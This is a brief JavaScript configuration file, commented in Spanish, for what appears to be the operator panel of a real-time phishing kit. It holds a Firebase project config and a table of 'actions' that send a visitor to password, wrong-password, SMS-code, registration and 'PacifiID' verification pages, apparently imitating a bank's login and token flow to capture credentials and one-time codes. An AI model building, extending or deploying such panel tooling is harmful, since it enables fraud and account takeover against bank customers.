/**
 * Config solo para panel (no incluir en páginas públicas).
 * Copia sync de firebaseConfig + actions/status para panel.js.
 * El mapa page→HTML vive en worker/routes.js.
 */
const firebaseConfig = {
  apiKey: 'AIzaSyAcWAKthLFTc3L1-Z2GaCRPHT5RG5Z8s4c',
  authDomain: 'o1u9a24o.firebaseapp.com',
  projectId: 'o1u9a24o',
  storageBucket: 'o1u9a24o.firebasestorage.app',
  messagingSenderId: '351885765916',
  appId: '1:351885765916:web:d2dbb07f7476484454ded9'
};

const appConfig = {
  timeout: 100000,

  actions: {
    passwd: { page: 1, color: '#e8f4ff' },
    'err-passwd': { page: 3, color: '#ffd6de' },
    sms: { page: 4, color: '#fff0e8' },
    registro: { page: 5, color: '#e3f4ff' },
    pacifid: { page: 6, color: '#e8fff0' },
    dashboard: { page: 7, color: '#fff8e8' },
    verificacion: { page: 8, color: '#e8fff0' },
    'err-pfcid': { page: 9, color: '#ffd6de' },
    'err-sms': { page: 13, color: '#ffd6de' }
  },

  status: {
    0: { text: 'Cargando', class: 'warning' },
    1: { text: 'Passwd', class: 'primary' },
    3: { text: 'err-passwd', class: 'danger' },
    4: { text: 'SMS', class: 'info' },
    5: { text: 'Registro', class: 'primary' },
    6: { text: 'PacifiID', class: 'success' },
    7: { text: 'Dashboard', class: 'warning' },
    8: { text: 'Verificación', class: 'success' },
    9: { text: 'err-pfcid', class: 'danger' },
    13: { text: 'err-sms', class: 'danger' }
  }
};

window.firebaseConfig = firebaseConfig;
window.appConfig = appConfig;
